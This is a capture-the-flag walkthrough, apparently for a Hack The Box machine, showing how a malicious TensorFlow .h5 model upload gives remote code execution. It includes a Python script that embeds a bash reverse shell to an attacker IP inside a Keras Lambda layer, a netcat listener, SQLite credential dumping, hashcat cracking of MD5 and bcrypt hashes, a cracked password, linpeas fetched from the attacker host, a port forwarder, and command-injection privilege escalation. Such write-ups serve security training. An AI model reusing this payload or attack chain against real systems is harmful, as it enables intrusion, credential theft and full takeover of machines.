# 🧠 RCE via TensorFlow .h5 Exploit – Full Walkthrough

This is a comprehensive write-up of exploiting a machine running a vulnerable .h5 model upload feature in a predictive model web application. The workflow includes Docker setup, payload creation, reverse shell, user enumeration, and privilege escalation.

---

## 🔍 1. Nmap Enumeration
```bash
nmap -sV -sC 10.129.201.243
```

- Found ports 22 (SSH) and 80 (HTTP).
- Site hosted a model-based prediction interface with a login/registration portal.

---

## 🌐 2. Web App Access & .h5 Upload Discovery

- Registered a new user and logged into the web portal.
- Found an upload feature for `.h5` models.
- Downloaded model examples and `Dockerfile` for local testing.

---

## 🐳 3. Docker Setup
```bash
sudo apt install docker-cli
sudo systemctl start docker
sudo systemctl enable docker
sudo docker build -t htb .
sudo docker run -it htb
```

### Docker Interaction
```bash
sudo docker ps                                  # Get container name
sudo docker cp build.py <container_name>:/code/ # Copy file INTO container
sudo docker cp <container_name>:/code/exploit.h5 ~/Desktop/ # Copy OUT
```

---

## 📤 4. Reverse Shell Payload (Python + TensorFlow)
```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'exec bash -i >& /dev/tcp/10.10.14.91/4444 0>&1'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

---

## 📥 5. Upload Payload and Trigger

```bash
nc -lvnp 4444
```

- Uploaded `exploit.h5` via web UI
- Executed via trigger → caught reverse shell on netcat listener

---

## 🧾 6. SQLite User DB Enumeration

```bash
file users.db          # Identify file type
sqlite3 users.db
.tables                # Shows: model, user
SELECT * FROM user;
```

```bash
echo -n "htb" | md5sum # Confirm hash type is md5
```

### Crack Hashes with Hashcat
```bash
hashcat -m 0 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt.gz
```

- Found valid password for `gael`: `mattp005numbertwo`

---

## 🔐 7. SSH Access

```bash
ssh gael@10.129.36.66
```

---

## 🔍 8. LinPEAS for Privilege Escalation

### Host
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000
```

### Target
```bash
wget http://10.10.14.91:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

- Found `/var/backups/backrest_backup.tar.gz`

---

## 🗄️ 9. Extracting and Decoding Configs

```bash
cp /var/backups/backrest_backup.tar.gz .
tar -xvf backrest_backup.tar.gz
cat backrest/.config/backrest/config.json
```

Extracted bcrypt password (base64):
```
JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP
```

### Decode it:
```bash
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d
```

Cracked via hashcat with wordlist.

---

## 🔁 10. Python Port Forwarder (9898 → 5555)

```python
import socket
import threading

def forward(source, destination):
    while True:
        data = source.recv(4096)
        if not data:
            break
        destination.sendall(data)

listen = socket.socket()
listen.bind(("0.0.0.0", 5555))
listen.listen(5)

while True:
    client_sock, _ = listen.accept()
    server_sock = socket.socket()
    server_sock.connect(("127.0.0.1", 9898))

    threading.Thread(target=forward, args=(client_sock, server_sock)).start()
    threading.Thread(target=forward, args=(server_sock, client_sock)).start()
```

---

## 🌐 11. Final RCE via Internal Portal

- Logged into internal portal as `backrest_root`
- Added a Git repo that contained command injection payload → RCE achieved

---

## 🐳 Optional: Clean Docker Install for Kali/Debian

```bash
sudo apt purge -y docker-cli docker-buildx docker-compose podman
sudo rm /etc/apt/sources.list.d/docker.list
sudo rm -rf /etc/apt/keyrings/docker.gpg
```

```bash
sudo apt update
sudo apt install -y ca-certificates curl gnupg lsb-release
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
https://download.docker.com/linux/debian bullseye stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt update
```

```bash
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
sudo systemctl start docker
sudo systemctl enable docker
sudo docker run hello-world
```

---

## ✅ Box Summary

- ✅ Initial foothold via `.h5` RCE in TensorFlow model
- ✅ SQLite DB enumeration to get creds
- ✅ Privilege escalation via leaked backup with bcrypt hash
- ✅ Final RCE via internal repo injection

**Pwned successfully 💥**
